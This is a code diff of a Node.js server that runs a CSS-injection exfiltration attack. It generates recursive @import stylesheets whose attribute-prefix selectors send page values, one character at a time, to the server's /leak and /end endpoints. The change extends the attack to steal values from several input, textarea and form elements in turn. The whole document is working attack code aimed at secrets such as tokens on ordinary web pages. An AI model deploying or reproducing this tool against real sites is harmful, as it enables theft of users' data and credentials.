@@ -5,7 +5,7 @@ const port = 5001;
 const HOSTNAME = "http://localhost:5001";
 const ELEMENTS = ["input","textarea","form"];
 const ATTRIBUTES = {__proto__:null,"input":["name","value"],"textarea":["name"],"form":["action"]};
-const MAX_ELEMENTS = 1;
+const MAX_ELEMENTS = 4;
 const MAX_VALUE = 50;
 const WAIT_TIME_MS = 250;
 
@@ -13,12 +13,11 @@ const CHARS = String.fromCodePoint(32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,
 
 var pending = [];
 var stop = false, n = 0, prefixes = {__proto__:null};
-var tokens = [], foundToken = false;
+var tokens = [], foundToken = false, currentElementPos = 0;
 
 const requestHandler = (request, response) => {
     let req = url.parse(request.url, url);
     if (stop) {
-        completed();
         return response.end();
     }
     switch (req.pathname) {
@@ -29,23 +28,23 @@ const requestHandler = (request, response) => {
             stop = false;        
             pending = [];
             foundToken = false;
-            genResponse(response);
+            currentElementPos = 0;
+            genResponse(response, 0);
         break;
         case "/leak":
             response.end();
             for(let element of ELEMENTS) {
-                for(let attribute of ATTRIBUTES[element]) { 
-                    for(let i=0;i<MAX_ELEMENTS;i++) {  
-                        if(n === +req.query.n) {
-                            if(typeof req.query['p_'+element+attribute+i] !== 'undefined') {
-                                if(typeof prefixes['p_'+element+attribute+i] === 'undefined') {
-                                    prefixes['p_'+element+attribute+i] = '';
-                                } 
-                                prefixes['p_'+element+attribute+i] = req.query['p_'+element+attribute+i];
-                                foundToken = true;
-                            }
+                for(let attribute of ATTRIBUTES[element]) {                 
+                    let elementNumber = +req.query.elementNumber;
+                    if(n === +req.query.n && currentElementPos === elementNumber) {
+                        if(typeof req.query['p_'+element+attribute+elementNumber] !== 'undefined') {
+                            if(typeof prefixes['p_'+element+attribute+elementNumber] === 'undefined') {
+                                prefixes['p_'+element+attribute+elementNumber] = '';
+                            } 
+                            prefixes['p_'+element+attribute+elementNumber] = req.query['p_'+element+attribute+elementNumber];
+                            foundToken = true;
                         }
-                    }
+                    }                
                 }
             }
             //console.log('\tleak: waiting others...');   
@@ -54,50 +53,46 @@ const requestHandler = (request, response) => {
             pending.push(response);            
             //console.log('\tquery: waiting others...');
             setTimeout(x=>{            
-                if(pending.length) {
-                    if(foundToken) {
-                        n++;
-                        genResponse(pending.shift());          
-                        foundToken = false;
-                    } else {
-                        stop = true;
-                        completed();
-                    }
-                }            
+                if(!foundToken) {
+                    currentElementPos++;   
+                }
+                foundToken =false;
+                if(pending.length) {            
+                    n++;
+                    genResponse(pending.shift(), currentElementPos);
+                }          
             }, WAIT_TIME_MS);
         break;
         case "/end":   
-            let tokenName = req.query.tokenName;
-            let tokenValue = req.query.tokenValue;
-            if(!hasToken(tokenName,tokenValue)) {
-                tokens.push({tokenName, tokenValue});
-            }
-            if(stop) {
-                completed();
-                response.end();   
-            }
+            response.end();
+            let attribute = req.query.attribute;
+            let tag = req.query.tag;
+            let value = req.query.value;
+            let tagNumber = +req.query.tagNumber;
+            if(!hasToken({tag, attribute, tagNumber, value})) {
+                tokens.push({tag, attribute, tagNumber, value});
+                foundToken = true;
+            }           
         default:
             response.end();
     }
 }
 
-const genResponse = (response) => {
+const genResponse = (response, elementNumber) => {
     let css = '@import url('+ HOSTNAME + '/next?' + Date.now() + ');';
     let properties = [];
     for(let element of ELEMENTS) {
         for(let attribute of ATTRIBUTES[element]) { 
-            for(let i=0;i<MAX_ELEMENTS;i++) {          
-                const variablePrefix = '--'+element+'-'+attribute+'-'+i+'-'+n;  
-                if(typeof prefixes['p_'+element+attribute+i] === 'undefined') {
-                    prefixes['p_'+element+attribute+i] = '';
-                }
-                const prefix = prefixes['p_'+element+attribute+i];
-                css += CHARS.map(e => ('html:has('+element+'['+attribute+'^="' + escapeCSS(prefix + e) + '"])' + '{'+variablePrefix+'s:url(' + HOSTNAME + '/leak?t='+Date.now()+'&n='+n+'&p_'+element+attribute+i+'=' + encodeURIComponent(prefix + e) +');}')).join('');                                        
-                css += 'html:has(['+attribute+'="'+ prefix + '"]){'+variablePrefix+'full-token:url(' + HOSTNAME + '/end?tokenName='+element+attribute+i+'&tokenValue=' + encodeURIComponent(prefix) + ');}';            
+            const variablePrefix = '--'+element+'-'+attribute+'-'+elementNumber+'-'+n;  
+            if(typeof prefixes['p_'+element+attribute+elementNumber] === 'undefined') {
+                prefixes['p_'+element+attribute+elementNumber] = '';
             }
+            const prefix = prefixes['p_'+element+attribute+elementNumber];
+            css += CHARS.map(e => ('html:has('+element+'['+attribute+'^="' + escapeCSS(prefix + e) + '"]'+generateNotSelectors(element,attribute)+')' + '{'+variablePrefix+'s:url(' + HOSTNAME + '/leak?elementNumber='+(elementNumber)+'&t='+Date.now()+'&n='+n+'&p_'+element+attribute+elementNumber+'=' + encodeURIComponent(prefix + e) +');}')).join('');                                            
+            css += 'html:has(['+attribute+'="'+ prefix + '"]'+generateNotSelectors(element,attribute)+')'+'{'+variablePrefix+'full-token:url(' + HOSTNAME + '/end?tag='+element+'&attribute='+attribute+'&tagNumber='+elementNumber+'&value=' + encodeURIComponent(prefix) + ');}';                            
         }
     }
-    if(n === 0) {  
+    if(n === 0 && elementNumber === 0) {  
         for(let element of ELEMENTS) {
             for(let attribute of ATTRIBUTES[element]) {         
                 for(let i=0;i<MAX_ELEMENTS;i++) { 
@@ -129,10 +124,37 @@ function escapeCSS(str) {
     return str.replace(/(["\\])/,'\\$1');
 }
 
-function hasToken(tokenName, tokenValue) {
-    return tokens.find(tokenObject => tokenName === tokenObject.tokenName && tokenValue === tokenObject.tokenValue);
+function hasToken(newToken) {
+    let{tag, attribute, tagNumber, value} = newToken;
+    return tokens.find(tokenObject => tag === tokenObject.tag && attribute === tokenObject.attribute && tagNumber === tokenObject.tagNumber && value === tokenObject.value);
+}
+
+function checkCompleted(response) {
+    if(currentElementPos < MAX_ELEMENTS) {
+        prefixes = {__proto__:null};
+        stop = false;
+        n = 0;
+        genResponse(response, ++currentElementPos);
+    } else {
+        stop = true;            
+        completed();
+        response.end();   
+    }
 }
 
 function completed() {
     console.log("Completed.", tokens);
+}
+
+function generateNotSelectors(elementName, attributeName) {
+    let selectors = "";
+    if(!tokens.length) {
+        return '';
+    }
+    for(const tokenObject of tokens) {
+        if(tokenObject.tag === elementName && tokenObject.attribute === attributeName) {
+            selectors += ':not('+elementName+'['+escapeCSS(tokenObject.attribute)+'="'+ escapeCSS(tokenObject.value) + '"])';
+        }
+    }
+    return selectors;
 }
